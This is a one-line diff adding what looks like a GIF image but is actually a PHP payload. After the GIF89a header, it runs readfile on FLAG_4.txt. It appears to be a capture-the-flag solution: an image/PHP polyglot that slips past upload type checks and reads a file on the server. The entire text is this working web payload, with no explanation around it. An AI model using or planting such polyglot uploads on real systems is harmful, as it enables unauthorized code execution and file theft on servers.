@@ -1,0 +1,1 @@
+GIF89a;<?=readfile('FLAG_4.txt');?>
